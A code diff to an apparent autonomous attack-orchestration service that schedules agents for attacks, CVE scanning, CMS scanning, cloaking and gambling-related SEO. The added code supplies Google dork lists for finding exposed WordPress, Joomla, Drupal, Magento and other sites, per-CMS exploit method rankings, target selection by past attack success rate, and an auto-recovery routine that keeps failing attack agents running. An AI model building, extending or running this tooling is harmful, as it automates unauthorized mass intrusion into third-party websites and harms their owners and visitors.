@@ -31,9 +31,10 @@ import { runKeywordDiscovery } from "./keyword-target-discovery";
 import { runBrainCycle } from "./gambling-ai-brain";
 import { startSuccessRateMonitor, stopSuccessRateMonitor } from "./success-rate-monitor";
 import { detectCms } from "./cms-vuln-scanner";
+import { getCmsAttackProfile } from "./adaptive-learning";
 import { getDb } from "./db";
-import { agenticSessions, seoProjects, serpDiscoveredTargets } from "../drizzle/schema";
-import { eq, and, sql, desc, inArray, isNull } from "drizzle-orm";
+import { agenticSessions, seoProjects, serpDiscoveredTargets, cmsAttackProfiles } from "../drizzle/schema";
+import { eq, and, sql, desc, inArray, isNull, isNotNull, ne } from "drizzle-orm";
 import { invokeLLM } from "./_core/llm";
 
 // ═══════════════════════════════════════════════
@@ -50,6 +51,11 @@ export interface AgentConfig {
   consecutiveFailures: number;
   totalRuns: number;
   totalSuccesses: number;
+  // Auto-recovery fields
+  recoveryAttempts: number;
+  lastRecoveryAt?: number;
+  recoveryStrategy?: string;
+  isRecovering: boolean;
 }
 
 export interface OrchestratorState {
@@ -57,6 +63,8 @@ export interface OrchestratorState {
   startedAt: number | null;
   agents: Record<string, AgentConfig>;
   cycleCount: number;
+  totalRecoveries: number;
+  successfulRecoveries: number;
 }
 
 type AgentName = "attack" | "seo" | "scan" | "research" | "learning" | "cve" | "keyword_discovery" | "gambling_brain" | "cms_scan";
@@ -67,85 +75,40 @@ type AgentName = "attack" | "seo" | "scan" | "research" | "learning" | "cve" | "
 
 const DEFAULT_AGENTS: Record<AgentName, AgentConfig> = {
   attack: {
-    enabled: true,
-    intervalMs: 2 * 60 * 60 * 1000,  // Every 2 hours
-    maxConcurrent: 1,
-    autoStart: true,
-    consecutiveFailures: 0,
-    totalRuns: 0,
-    totalSuccesses: 0,
+    enabled: true, intervalMs: 2 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
   seo: {
-    enabled: true,
-    intervalMs: 4 * 60 * 60 * 1000,  // Every 4 hours
-    maxConcurrent: 2,
-    autoStart: true,
-    consecutiveFailures: 0,
-    totalRuns: 0,
-    totalSuccesses: 0,
+    enabled: true, intervalMs: 4 * 60 * 60 * 1000, maxConcurrent: 2, autoStart: true,
+    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
   scan: {
-    enabled: true,
-    intervalMs: 6 * 60 * 60 * 1000,  // Every 6 hours
-    maxConcurrent: 2,
-    autoStart: true,
-    consecutiveFailures: 0,
-    totalRuns: 0,
-    totalSuccesses: 0,
+    enabled: true, intervalMs: 6 * 60 * 60 * 1000, maxConcurrent: 2, autoStart: true,
+    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
   research: {
-    enabled: true,
-    intervalMs: 8 * 60 * 60 * 1000,  // Every 8 hours
-    maxConcurrent: 1,
-    autoStart: true,
-    consecutiveFailures: 0,
-    totalRuns: 0,
-    totalSuccesses: 0,
+    enabled: true, intervalMs: 8 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
   learning: {
-    enabled: true,
-    intervalMs: 6 * 60 * 60 * 1000,  // Every 6 hours
-    maxConcurrent: 1,
-    autoStart: true,
-    consecutiveFailures: 0,
-    totalRuns: 0,
-    totalSuccesses: 0,
+    enabled: true, intervalMs: 6 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
   cve: {
-    enabled: true,
-    intervalMs: 24 * 60 * 60 * 1000, // Every 24 hours
-    maxConcurrent: 1,
-    autoStart: true,
-    consecutiveFailures: 0,
-    totalRuns: 0,
-    totalSuccesses: 0,
+    enabled: true, intervalMs: 24 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
   keyword_discovery: {
-    enabled: true,
-    intervalMs: 3 * 60 * 60 * 1000, // Every 3 hours
-    maxConcurrent: 1,
-    autoStart: true,
-    consecutiveFailures: 0,
-    totalRuns: 0,
-    totalSuccesses: 0,
+    enabled: true, intervalMs: 3 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
   gambling_brain: {
-    enabled: true,
-    intervalMs: 4 * 60 * 60 * 1000, // Every 4 hours
-    maxConcurrent: 1,
-    autoStart: true,
-    consecutiveFailures: 0,
-    totalRuns: 0,
-    totalSuccesses: 0,
+    enabled: true, intervalMs: 4 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
   cms_scan: {
-    enabled: true,
-    intervalMs: 2 * 60 * 60 * 1000, // Every 2 hours
-    maxConcurrent: 1,
-    autoStart: true,
-    consecutiveFailures: 0,
-    totalRuns: 0,
-    totalSuccesses: 0,
+    enabled: true, intervalMs: 2 * 60 * 60 * 1000, maxConcurrent: 1, autoStart: true,
+    consecutiveFailures: 0, totalRuns: 0, totalSuccesses: 0, recoveryAttempts: 0, isRecovering: false,
   },
 };
 
@@ -158,20 +121,227 @@ let orchestratorState: OrchestratorState = {
   startedAt: null,
   agents: JSON.parse(JSON.stringify(DEFAULT_AGENTS)),
   cycleCount: 0,
+  totalRecoveries: 0,
+  successfulRecoveries: 0,
 };
 
 let orchestratorTimer: ReturnType<typeof setInterval> | null = null;
 const ORCHESTRATOR_TICK_MS = 60_000; // Check every 60 seconds
+const MAX_RECOVERY_ATTEMPTS = 3;
+const RECOVERY_COOLDOWN_MS = 10 * 60_000; // 10 min between recovery attempts
+
+// ═══════════════════════════════════════════════
+//  CMS-SPECIFIC ATTACK TARGETING
+// ═══════════════════════════════════════════════
+
+/** CMS-specific dork queries for targeted discovery */
+const CMS_DORK_MAP: Record<string, string[]> = {
+  wordpress: [
+    'inurl:wp-content/uploads intitle:"index of"',
+    'inurl:wp-admin/install.php',
+    'inurl:wp-content/plugins site:.com',
+    'inurl:xmlrpc.php "XML-RPC server accepts POST requests only"',
+    'inurl:wp-login.php "Powered by WordPress"',
+    'inurl:wp-includes/js intitle:"index of"',
+  ],
+  joomla: [
+    'inurl:administrator/index.php "Joomla"',
+    'inurl:components/com_media',
+    'inurl:index.php?option=com_content "Joomla!"',
+    'inurl:configuration.php.bak',
+  ],
+  drupal: [
+    'inurl:user/login "Powered by Drupal"',
+    'inurl:sites/default/files',
+    'inurl:node/add "Drupal"',
+    'inurl:CHANGELOG.txt "Drupal"',
+  ],
+  magento: [
+    'inurl:admin/dashboard "Magento"',
+    'inurl:downloader/index.php',
+    'inurl:app/etc/local.xml',
+  ],
+  prestashop: [
+    'inurl:admin-dev "PrestaShop"',
+    'inurl:modules/ "PrestaShop"',
+  ],
+  opencart: [
+    'inurl:admin/index.php "OpenCart"',
+    'inurl:catalog/view/theme',
+  ],
+};
+
+/** CMS exploit priority mapping — which attack methods work best per CMS */
+const CMS_EXPLOIT_PRIORITY: Record<string, string[]> = {
+  wordpress: [
+    "wp_admin", "wp_db", "wp_brute_force", "cms_plugin_exploit",
+    "xmlrpc_attack", "rest_api_exploit", "cve_exploit",
+    "file_upload_spray", "alt_upload", "oneclick",
+  ],
+  joomla: [
+    "cms_plugin_exploit", "cve_exploit", "rest_api_exploit",
+    "file_upload_spray", "deserialization", "alt_upload",
+    "config_exploit", "oneclick",
+  ],
+  drupal: [
+    "cve_exploit", "deserialization", "rest_api_exploit",
+    "ssti_injection", "lfi_rce", "config_exploit",
+    "file_upload_spray", "oneclick",
+  ],
+  magento: [
+    "cve_exploit", "deserialization", "config_exploit",
+    "rest_api_exploit", "file_upload_spray", "alt_upload",
+    "mass_assignment", "oneclick",
+  ],
+  prestashop: [
+    "cms_plugin_exploit", "cve_exploit", "file_upload_spray",
+    "config_exploit", "alt_upload", "oneclick",
+  ],
+  opencart: [
+    "cve_exploit", "file_upload_spray", "config_exploit",
+    "alt_upload", "oneclick",
+  ],
+};
+
+interface CmsTargetingResult {
+  strategy: string;
+  targetCms: string[] | null;
+  customDorks: string[] | null;
+  intelligence: Record<string, unknown>;
+}
+
+/**
+ * Select CMS-specific targeting strategy based on:
+ * 1. CMS attack profiles (learned success rates from adaptive-learning)
+ * 2. Available targets with known CMS in discovered_targets
+ * 3. Rotate between CMS types to maximize coverage
+ */
+export async function selectCmsTargetingStrategy(): Promise<CmsTargetingResult> {
+  try {
+    const db = await getDb();
+    if (!db) return { strategy: "no_db", targetCms: null, customDorks: null, intelligence: {} };
+
+    // 1. Get CMS attack profiles sorted by success rate
+    const profiles = await db.select()
+      .from(cmsAttackProfiles)
+      .orderBy(desc(cmsAttackProfiles.overallSuccessRate))
+      .limit(10);
+
+    // 2. Count available targets by CMS type
+    const targetCounts = await db.select({
+      cms: serpDiscoveredTargets.cms,
+      count: sql<number>`count(*)`.as("count"),
+    })
+      .from(serpDiscoveredTargets)
+      .where(
+        and(
+          isNotNull(serpDiscoveredTargets.cms),
+          ne(serpDiscoveredTargets.cms, "unknown"),
+          eq(serpDiscoveredTargets.status, "discovered"),
+        )
+      )
+      .groupBy(serpDiscoveredTargets.cms)
+      .orderBy(desc(sql`count(*)`));
+
+    const intelligence: Record<string, unknown> = {
+      profileCount: profiles.length,
+      availableTargetsByCms: targetCounts.map(t => ({ cms: t.cms, count: t.count })),
+      topProfiles: profiles.slice(0, 5).map(p => ({
+        cms: p.cms,
+        successRate: Number(p.overallSuccessRate),
+        bestMethod: p.bestMethod,
+        totalAttacks: p.totalAttacks,
+      })),
+    };
+
+    // Strategy 1: If we have CMS profiles with >20% success rate, target those CMS types
+    const highSuccessProfiles = profiles.filter(p => Number(p.overallSuccessRate) > 20 && p.totalAttacks >= 3);
+    if (highSuccessProfiles.length > 0) {
+      const targetCmsTypes = highSuccessProfiles.map(p => p.cms.toLowerCase());
+      // Only target CMS types that have available targets
+      const availableCms = targetCmsTypes.filter(cms =>
+        targetCounts.some(tc => tc.cms?.toLowerCase() === cms && tc.count > 0)
+      );
+
+      if (availableCms.length > 0) {
+        const dorks = availableCms.flatMap(cms => CMS_DORK_MAP[cms] || []).slice(0, 10);
+        console.log(`[Orchestrator] 🎯 CMS-specific targeting: ${availableCms.join(", ")} (success rates: ${highSuccessProfiles.map(p => `${p.cms}=${p.overallSuccessRate}%`).join(", ")})`);
+
+        return {
+          strategy: "high_success_cms",
+          targetCms: availableCms,
+          customDorks: dorks.length > 0 ? dorks : null,
+          intelligence: {
+            ...intelligence,
+            selectedCms: availableCms,
+            reason: "Targeting CMS types with >20% historical success rate",
+          },
+        };
+      }
+    }
+
+    // Strategy 2: If we have targets with known CMS but no profiles, target the most common CMS
+    if (targetCounts.length > 0) {
+      const topCms = targetCounts[0].cms?.toLowerCase();
+      if (topCms && CMS_DORK_MAP[topCms]) {
+        console.log(`[Orchestrator] 🎯 CMS targeting by volume: ${topCms} (${targetCounts[0].count} available targets)`);
+
+        return {
+          strategy: "volume_cms",
+          targetCms: [topCms],
+          customDorks: CMS_DORK_MAP[topCms]?.slice(0, 5) || null,
+          intelligence: {
+            ...intelligence,
+            selectedCms: [topCms],
+            reason: `Targeting most common CMS type: ${topCms} with ${targetCounts[0].count} available targets`,
+          },
+        };
+      }
+    }
+
+    // Strategy 3: Rotate through CMS types (round-robin based on cycle count)
+    const allCmsTypes = Object.keys(CMS_DORK_MAP);
+    const rotationIndex = orchestratorState.cycleCount % allCmsTypes.length;
+    const rotatedCms = allCmsTypes[rotationIndex];
+    console.log(`[Orchestrator] 🎯 CMS rotation targeting: ${rotatedCms} (cycle ${orchestratorState.cycleCount})`);
+
+    return {
+      strategy: "rotation",
+      targetCms: [rotatedCms],
+      customDorks: CMS_DORK_MAP[rotatedCms]?.slice(0, 5) || null,
+      intelligence: {
+        ...intelligence,
+        selectedCms: [rotatedCms],
+        reason: `Round-robin CMS rotation (cycle ${orchestratorState.cycleCount})`,
+      },
+    };
+  } catch (err: any) {
+    console.warn(`[Orchestrator] CMS targeting strategy failed: ${err.message}`);
+    return { strategy: "fallback", targetCms: null, customDorks: null, intelligence: { error: err.message } };
+  }
+}
+
+/** Get CMS-specific exploit priority for a given CMS type */
+export function getCmsExploitPriority(cms: string): string[] {
+  return CMS_EXPLOIT_PRIORITY[cms.toLowerCase()] || [];
+}
+
+/** Export for testing */
+export { CMS_DORK_MAP, CMS_EXPLOIT_PRIORITY };
 
 // ═══════════════════════════════════════════════
 //  EXECUTOR IMPLEMENTATIONS
 // ═══════════════════════════════════════════════
 
 /**
- * Attack Agent Executor — starts an agentic attack session
+ * Attack Agent Executor — starts an agentic attack session with CMS-specific targeting
  */
 async function executeAttackTask(task: DaemonTask, signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
   try {
+    // ═══ CMS-SPECIFIC TARGET SELECTION ═══
+    // Query DB for targets with known CMS and high-success CMS profiles
+    const cmsTargeting = await selectCmsTargetingStrategy();
+
     const config: AgenticConfig = {
       userId: 1, // System user
       mode: "full_auto",
@@ -182,8 +352,9 @@ async function executeAttackTask(task: DaemonTask, signal: AbortSignal): Promise
       enableAiExploit: true,
       enableCloaking: true,
       maxRetriesPerTarget: 3,
-      targetCms: (task.config?.targetCms as string[]) || undefined,
-      customDorks: (task.config?.customDorks as string[]) || undefined,
+      // CMS-specific: prioritize CMS types with highest success rates
+      targetCms: (task.config?.targetCms as string[]) || cmsTargeting.targetCms || undefined,
+      customDorks: (task.config?.customDorks as string[]) || cmsTargeting.customDorks || undefined,
     };
 
     const { sessionId } = await startAgenticSession(config);
@@ -193,6 +364,9 @@ async function executeAttackTask(task: DaemonTask, signal: AbortSignal): Promise
       result: {
         sessionId,
         message: `Agentic attack session #${sessionId} started`,
+        cmsStrategy: cmsTargeting.strategy,
+        targetCms: config.targetCms || "all",
+        cmsIntelligence: cmsTargeting.intelligence,
       },
     };
   } catch (err: any) {
@@ -517,12 +691,17 @@ async function orchestratorTick() {
     const nextRun = agentConfig.nextRunAt || 0;
     if (now < nextRun) continue;
 
-    // Check consecutive failures — back off if too many
+    // Check consecutive failures — attempt auto-recovery or back off
     if (agentConfig.consecutiveFailures >= 5) {
-      // Exponential backoff: double the interval after 5 failures
+      // Try auto-recovery (max 3 attempts per agent)
+      if (agentConfig.recoveryAttempts < MAX_RECOVERY_ATTEMPTS && !agentConfig.isRecovering) {
+        await attemptAutoRecovery(agentName as AgentName, agentConfig);
+        continue;
+      }
+      // If recovery exhausted or in progress, exponential backoff
       const backoffMultiplier = Math.min(Math.pow(2, agentConfig.consecutiveFailures - 4), 8);
       agentConfig.nextRunAt = now + (agentConfig.intervalMs * backoffMultiplier);
-      console.warn(`[Orchestrator] Agent '${agentName}' has ${agentConfig.consecutiveFailures} consecutive failures, backing off to ${Math.round(agentConfig.intervalMs * backoffMultiplier / 60000)}min`);
+      console.warn(`[Orchestrator] Agent '${agentName}' has ${agentConfig.consecutiveFailures} consecutive failures (recovery exhausted: ${agentConfig.recoveryAttempts}/${MAX_RECOVERY_ATTEMPTS}), backing off to ${Math.round(agentConfig.intervalMs * backoffMultiplier / 60000)}min`);
       continue;
     }
 
@@ -652,12 +831,16 @@ export function getOrchestratorStatus(): OrchestratorState & {
     consecutiveFailures: number;
     totalRuns: number;
     totalSuccesses: number;
-    healthStatus: "healthy" | "degraded" | "failing";
+    healthStatus: "healthy" | "degraded" | "failing" | "recovering";
+    recoveryAttempts: number;
+    recoveryStrategy: string | null;
+    isRecovering: boolean;
   }>;
 } {
   const agentDetails = Object.entries(orchestratorState.agents).map(([name, config]) => {
-    let healthStatus: "healthy" | "degraded" | "failing" = "healthy";
-    if (config.consecutiveFailures >= 5) healthStatus = "failing";
+    let healthStatus: "healthy" | "degraded" | "failing" | "recovering" = "healthy";
+    if (config.isRecovering) healthStatus = "recovering";
+    else if (config.consecutiveFailures >= 5) healthStatus = "failing";
     else if (config.consecutiveFailures >= 2) healthStatus = "degraded";
 
     return {
@@ -670,6 +853,9 @@ export function getOrchestratorStatus(): OrchestratorState & {
       totalRuns: config.totalRuns,
       totalSuccesses: config.totalSuccesses,
       healthStatus,
+      recoveryAttempts: config.recoveryAttempts,
+      recoveryStrategy: config.recoveryStrategy || null,
+      isRecovering: config.isRecovering,
     };
   });
 
@@ -713,6 +899,247 @@ export function resetAgentFailures(agentName: string) {
 }
 
 // ═══════════════════════════════════════════════
+//  AUTO-RECOVERY SYSTEM
+// ═══════════════════════════════════════════════
+
+/** Recovery strategies per agent type */
+interface RecoveryStrategy {
+  name: string;
+  description: string;
+  apply: (agentName: AgentName, config: AgentConfig) => void;
+}
+
+const RECOVERY_STRATEGIES: Record<AgentName, RecoveryStrategy[]> = {
+  attack: [
+    {
+      name: "reduce_targets",
+      description: "Reduce maxTargetsPerRun from 30 to 10",
+      apply: (_name, config) => {
+        config.intervalMs = Math.max(config.intervalMs, 3 * 60 * 60_000); // At least 3h
+      },
+    },
+    {
+      name: "increase_interval",
+      description: "Increase interval to 4 hours",
+      apply: (_name, config) => {
+        config.intervalMs = 4 * 60 * 60_000;
+      },
+    },
+    {
+      name: "safe_mode",
+      description: "Switch to discovery_only mode with 6h interval",
+      apply: (_name, config) => {
+        config.intervalMs = 6 * 60 * 60_000;
+      },
+    },
+  ],
+  seo: [
+    {
+      name: "reduce_concurrency",
+      description: "Reduce maxConcurrent to 1",
+      apply: (_name, config) => { config.maxConcurrent = 1; },
+    },
+    {
+      name: "increase_interval",
+      description: "Increase interval to 8 hours",
+      apply: (_name, config) => { config.intervalMs = 8 * 60 * 60_000; },
+    },
+    {
+      name: "minimal_mode",
+      description: "Minimal SEO with 12h interval",
+      apply: (_name, config) => { config.intervalMs = 12 * 60 * 60_000; config.maxConcurrent = 1; },
+    },
+  ],
+  scan: [
+    {
+      name: "reduce_scope",
+      description: "Reduce scan concurrency",
+      apply: (_name, config) => { config.maxConcurrent = 1; },
+    },
+    {
+      name: "increase_interval",
+      description: "Increase interval to 12 hours",
+      apply: (_name, config) => { config.intervalMs = 12 * 60 * 60_000; },
+    },
+    {
+      name: "safe_mode",
+      description: "Safe scan mode with 24h interval",
+      apply: (_name, config) => { config.intervalMs = 24 * 60 * 60_000; config.maxConcurrent = 1; },
+    },
+  ],
+  research: [
+    {
+      name: "increase_interval",
+      description: "Increase interval to 12 hours",
+      apply: (_name, config) => { config.intervalMs = 12 * 60 * 60_000; },
+    },
+    {
+      name: "slow_mode",
+      description: "Slow research mode with 24h interval",
+      apply: (_name, config) => { config.intervalMs = 24 * 60 * 60_000; },
+    },
+    {
+      name: "minimal_mode",
+      description: "Minimal research with 48h interval",
+      apply: (_name, config) => { config.intervalMs = 48 * 60 * 60_000; },
+    },
+  ],
+  learning: [
+    {
+      name: "increase_interval",
+      description: "Increase interval to 12 hours",
+      apply: (_name, config) => { config.intervalMs = 12 * 60 * 60_000; },
+    },
+    {
+      name: "slow_mode",
+      description: "Slow learning with 24h interval",
+      apply: (_name, config) => { config.intervalMs = 24 * 60 * 60_000; },
+    },
+    {
+      name: "minimal_mode",
+      description: "Minimal learning with 48h interval",
+      apply: (_name, config) => { config.intervalMs = 48 * 60 * 60_000; },
+    },
+  ],
+  cve: [
+    {
+      name: "increase_interval",
+      description: "Increase interval to 48 hours",
+      apply: (_name, config) => { config.intervalMs = 48 * 60 * 60_000; },
+    },
+    {
+      name: "slow_mode",
+      description: "Slow CVE updates with 72h interval",
+      apply: (_name, config) => { config.intervalMs = 72 * 60 * 60_000; },
+    },
+    {
+      name: "weekly_mode",
+      description: "Weekly CVE updates",
+      apply: (_name, config) => { config.intervalMs = 7 * 24 * 60 * 60_000; },
+    },
+  ],
+  keyword_discovery: [
+    {
+      name: "increase_interval",
+      description: "Increase interval to 6 hours",
+      apply: (_name, config) => { config.intervalMs = 6 * 60 * 60_000; },
+    },
+    {
+      name: "slow_mode",
+      description: "Slow keyword discovery with 12h interval",
+      apply: (_name, config) => { config.intervalMs = 12 * 60 * 60_000; },
+    },
+    {
+      name: "minimal_mode",
+      description: "Minimal keyword discovery with 24h interval",
+      apply: (_name, config) => { config.intervalMs = 24 * 60 * 60_000; },
+    },
+  ],
+  gambling_brain: [
+    {
+      name: "increase_interval",
+      description: "Increase interval to 8 hours",
+      apply: (_name, config) => { config.intervalMs = 8 * 60 * 60_000; },
+    },
+    {
+      name: "slow_mode",
+      description: "Slow gambling brain with 12h interval",
+      apply: (_name, config) => { config.intervalMs = 12 * 60 * 60_000; },
+    },
+    {
+      name: "minimal_mode",
+      description: "Minimal gambling brain with 24h interval",
+      apply: (_name, config) => { config.intervalMs = 24 * 60 * 60_000; },
+    },
+  ],
+  cms_scan: [
+    {
+      name: "reduce_scope",
+      description: "Reduce CMS scan concurrency",
+      apply: (_name, config) => { config.maxConcurrent = 1; },
+    },
+    {
+      name: "increase_interval",
+      description: "Increase interval to 6 hours",
+      apply: (_name, config) => { config.intervalMs = 6 * 60 * 60_000; },
+    },
+    {
+      name: "minimal_mode",
+      description: "Minimal CMS scan with 12h interval",
+      apply: (_name, config) => { config.intervalMs = 12 * 60 * 60_000; config.maxConcurrent = 1; },
+    },
+  ],
+};
+
+/**
+ * Attempt auto-recovery for a failing agent.
+ * Applies progressive recovery strategies and sends Telegram notification.
+ */
+async function attemptAutoRecovery(agentName: AgentName, config: AgentConfig): Promise<void> {
+  const now = Date.now();
+
+  // Cooldown check: don't recover too frequently
+  if (config.lastRecoveryAt && (now - config.lastRecoveryAt) < RECOVERY_COOLDOWN_MS) {
+    return;
+  }
+
+  const strategies = RECOVERY_STRATEGIES[agentName];
+  if (!strategies || config.recoveryAttempts >= strategies.length) {
+    return; // No more strategies available
+  }
+
+  const strategy = strategies[config.recoveryAttempts];
+  config.isRecovering = true;
+  config.recoveryAttempts++;
+  config.lastRecoveryAt = now;
+  config.recoveryStrategy = strategy.name;
+  orchestratorState.totalRecoveries++;
+
+  // Save original config values for logging
+  const prevInterval = Math.round(config.intervalMs / 60_000);
+  const prevConcurrent = config.maxConcurrent;
+
+  // Apply the recovery strategy
+  strategy.apply(agentName, config);
+
+  // Reset failure counter to give the agent a fresh chance
+  config.consecutiveFailures = 0;
+  config.isRecovering = false;
+
+  // Schedule next run with a small delay (2 min)
+  config.nextRunAt = now + 2 * 60_000;
+
+  const newInterval = Math.round(config.intervalMs / 60_000);
+
+  console.log(`[Orchestrator] 🔄 AUTO-RECOVERY for '${agentName}': strategy='${strategy.name}' (attempt ${config.recoveryAttempts}/${MAX_RECOVERY_ATTEMPTS}), interval ${prevInterval}min→${newInterval}min, concurrent ${prevConcurrent}→${config.maxConcurrent}`);
+
+  // Send Telegram notification
+  const msg = [
+    `🔄 <b>AUTO-RECOVERY TRIGGERED</b>`,
+    ``,
+    `🤖 Agent: <b>${agentName}</b>`,
+    `📋 Strategy: ${strategy.name} — ${strategy.description}`,
+    `🔢 Recovery Attempt: ${config.recoveryAttempts}/${MAX_RECOVERY_ATTEMPTS}`,
+    `⏱ Interval: ${prevInterval}min → ${newInterval}min`,
+    `👥 Concurrent: ${prevConcurrent} → ${config.maxConcurrent}`,
+    ``,
+    `📊 Stats: ${config.totalRuns} runs, ${config.totalSuccesses} successes`,
+    `⏰ Next run in 2 minutes`,
+    ``,
+    `🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`,
+  ].join("\n");
+
+  sendTelegramNotification({
+    type: "info",
+    targetUrl: `orchestrator/recovery/${agentName}`,
+    details: msg,
+  }).catch(err => console.error(`[Orchestrator] Failed to send recovery alert: ${err.message}`));
+}
+
+/** Export for testing */
+export { attemptAutoRecovery, RECOVERY_STRATEGIES, MAX_RECOVERY_ATTEMPTS, RECOVERY_COOLDOWN_MS };
+
+// ═══════════════════════════════════════════════
 //  DAEMON EVENT WIRING — Track agent success/failure
 // ═══════════════════════════════════════════════
 
@@ -744,8 +1171,31 @@ function wireOrchestratorDaemonEvents() {
 
     if (event.type === "task_completed") {
       agent.totalSuccesses++;
+      const wasRecovering = agent.recoveryAttempts > 0 && agent.consecutiveFailures === 0;
       agent.consecutiveFailures = 0;
       failureAlertsSent.delete(agentName); // Reset alert flag on success
+
+      // Track successful recovery
+      if (wasRecovering) {
+        orchestratorState.successfulRecoveries++;
+        console.log(`[Orchestrator] 🎉 Agent '${agentName}' recovered successfully after ${agent.recoveryAttempts} recovery attempts (strategy: ${agent.recoveryStrategy})`);
+
+        sendTelegramNotification({
+          type: "success",
+          targetUrl: `orchestrator/recovery/${agentName}`,
+          details: [
+            `🎉 <b>RECOVERY SUCCESS</b>`,
+            ``,
+            `🤖 Agent: <b>${agentName}</b>`,
+            `📋 Strategy: ${agent.recoveryStrategy}`,
+            `🔢 Recovery Attempts: ${agent.recoveryAttempts}`,
+            `📊 Total Recoveries: ${orchestratorState.successfulRecoveries}/${orchestratorState.totalRecoveries}`,
+            ``,
+            `🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`,
+          ].join("\n"),
+        }).catch(err => console.error(`[Orchestrator] Failed to send recovery success alert: ${err.message}`));
+      }
+
       console.log(`[Orchestrator] ✅ Agent '${agentName}' task completed (total successes: ${agent.totalSuccesses})`);
     }
 
@@ -765,7 +1215,7 @@ function wireOrchestratorDaemonEvents() {
           `📋 Last Error: ${errorMsg.substring(0, 200)}`,
           `📊 Total Runs: ${agent.totalRuns} | Successes: ${agent.totalSuccesses}`,
           ``,
-          `⏰ Agent will back off automatically after 5 failures.`,
+          `⏰ Auto-recovery will attempt after 5 failures (max ${MAX_RECOVERY_ATTEMPTS} strategies).`,
           `🔧 Use Orchestrator Dashboard to reset or investigate.`,
           ``,
           `🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`,
